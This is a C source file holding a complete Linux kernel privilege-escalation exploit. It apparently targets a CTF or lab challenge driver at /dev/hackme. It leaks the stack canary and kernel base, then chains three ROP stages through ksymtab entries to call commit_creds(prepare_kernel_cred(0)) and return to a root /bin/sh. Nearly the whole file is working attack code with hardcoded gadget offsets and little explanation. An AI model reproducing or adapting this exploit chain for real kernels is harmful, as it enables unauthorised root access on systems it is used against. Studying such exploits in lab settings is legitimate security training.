#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>


typedef unsigned long long ull;


// / # cat /proc/kallsyms | grep __ksymtab_commit_cred
// ffffffff81f87d90 r __ksymtab_commit_creds
// / # cat /proc/kallsyms | grep __ksymtab_prepare_kernel_cred
// ffffffff81f8d4fc r __ksymtab_prepare_kernel_cred


#define KERN_BASE (0xffff880000000000UL)
const unsigned long long kernel_base = 0xffff880000000000;

ull off_pop_rax = 0xffffffff81004d11 - KERN_BASE; // : pop rax ; ret
ull off_mov_eax_ptr_rax_pop_rbp = 0xffffffff81015a80 - KERN_BASE; // : mov eax, dword ptr [rax] ; pop rbp ; ret
ull off_pop_rdi = 0xffffffff81006370 - KERN_BASE; // : pop rdi ; ret
ull off_pop_rcx_rbp = 0xffffffff81004857 - KERN_BASE; // : pop rcx ; pop rbp ; ret
ull off_mov_rdi_rax_rep_pop_rbp = 0xffffffff8100aedf - KERN_BASE; // : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; pop rbp ; ret

ull off_ksymtab_commit_creds = 0xffffffff81f87d90  - KERN_BASE;
ull off_ksymtab_prepare_kernel_cred = 0xffffffff81f8d4fc - KERN_BASE;
ull off_swapgs_iretq = 0xffffffff81200f26 - KERN_BASE;



char buf[1024];

void shell(void) { // stage4
    char *argv[] = {
        "/bin/sh",
        NULL
    };
    execve("/bin/sh", argv, NULL);
}

ull user_cs, user_rflags, user_ss, user_sp;
void save_state(void) {
    __asm__ volatile (
            "mov %0, cs\n\t"
            "pushfq\n\t"
            "pop %1\n\t"
            "mov %2, ss\n\t"
            "mov %3, rsp\n\t"
            : "=r" (user_cs), "=r" (user_rflags), "=r" (user_ss), "=r" (user_sp)
            :
            : "memory"
            );
}

int fd;
ull canary, addr_kernel;
ull addr_prepare_kernel_cred, addr_commit_creds;

void escalate_priv(void) { // stage 3
    ull offset;
    __asm__ volatile (
            "mov %0, rax\n\t"
            : "=r" (offset));
    addr_commit_creds = (signed long)addr_kernel + (signed long)off_ksymtab_commit_creds + (signed int)offset;
    printf("[+] addr_commit_creds = %p\n", (void *)(addr_commit_creds));

    int i;
    memset(buf, 0, sizeof(buf));
    ull *rop = (ull *)(buf + 0x80);
    *rop ++= canary;
    *rop ++= 0xdeadbeef;
    *rop ++= 0xdeadbeef;
    *rop ++= 0xdeadbeef;
    *rop ++= addr_kernel + off_pop_rdi;
    *rop ++= 0ULL;
    *rop ++= addr_prepare_kernel_cred;
    *rop ++= addr_kernel + off_pop_rcx_rbp;
    *rop ++= 0ULL;
    *rop ++= 0xdeadbeef;
    *rop ++= addr_kernel + off_mov_rdi_rax_rep_pop_rbp;
    *rop ++= 0xdeadbeef;
    *rop ++= addr_commit_creds;
    *rop ++= addr_kernel + off_swapgs_iretq;
    *rop ++= 0xdeadbeef;
    *rop ++= 0xdeadbeef;
    *rop ++= (ull)shell;
    *rop ++= user_cs;
    *rop ++= user_rflags;
    *rop ++= user_sp;
    *rop ++= user_ss;
    write(fd, buf, 0x180);
}

void leak_ksymtab_cc(void) { // stage 2
    // handle leaked ksymtab_prepare_kernel_cred
    ull offset;
    __asm__ volatile (
            "mov %0, rax\n\t"
            : "=r" (offset));
    // Calculation has to be SIGNED for negative offset
    addr_prepare_kernel_cred = (signed long)addr_kernel + (signed long)off_ksymtab_prepare_kernel_cred + (signed int)offset;
    printf("[+] addr_prepare_kernel_cred = %p\n", (void *)(addr_prepare_kernel_cred));

    int i;
    memset(buf, 0, sizeof(buf));
    ull *rop = (ull *)(buf + 0x80);
    *rop ++= canary;
    *rop ++= 0xdeadbeef;
    *rop ++= 0xdeadbeef;
    *rop ++= 0xdeadbeef;
    *rop ++= addr_kernel + off_pop_rax;
    *rop ++= addr_kernel + off_ksymtab_commit_creds;
    *rop ++= addr_kernel + off_mov_eax_ptr_rax_pop_rbp;
    *rop ++= 0xdeadbeef; // pop rbp
    *rop ++= addr_kernel + off_swapgs_iretq;
    *rop ++= 0xdeadbeef;
    *rop ++= 0xdeadbeef;
    *rop ++= (ull)escalate_priv;
    *rop ++= user_cs;
    *rop ++= user_rflags;
    *rop ++= user_sp;
    *rop ++= user_ss;
    write(fd, buf, 0x140);
}

void leak_ksymtab_pkc(void) {  // stage 1
    int i;
    memset(buf, 0, sizeof(buf));
    ull *rop = (ull *)(buf + 0x80);
    *rop ++= canary;
    *rop ++= 0xdeadbeef;
    *rop ++= 0xdeadbeef;
    *rop ++= 0xdeadbeef;
    *rop ++= addr_kernel + off_pop_rax;
    *rop ++= addr_kernel + off_ksymtab_prepare_kernel_cred;
    *rop ++= addr_kernel + off_mov_eax_ptr_rax_pop_rbp;
    *rop ++= 0xdeadbeef; // pop rbp
    *rop ++= addr_kernel + off_swapgs_iretq; // mov rdi, rsp
    // Code at swapgs_restore_regs_and_return_to_usermode will 
    // copy previous kernel stack pointed by rdi to tranmpoline stack
    *rop ++= 0xdeadbeef;
    *rop ++= 0xdeadbeef;
    *rop ++= (ull)leak_ksymtab_cc;
    *rop ++= user_cs;
    *rop ++= user_rflags;
    *rop ++= user_sp;
    *rop ++= user_ss;
    write(fd, buf, 0x140);
}

int main(void) {
    save_state();

    if ((fd = open("/dev/hackme", O_RDWR)) < 0) {
        perror("open");
        return 1;
    }
    memset(buf, 0, sizeof(buf));
    read(fd, buf, 0x180);
    canary = *(ull *)(buf + 0x80);
    addr_kernel = *(ull *)(buf + 0x130) - 131939264667991; // 0xffff880000000000
    printf("canary = 0x%llx\n", canary);
    printf("addr_kernel = 0x%llx\n", addr_kernel);

    leak_ksymtab_pkc();

    return 0;
}
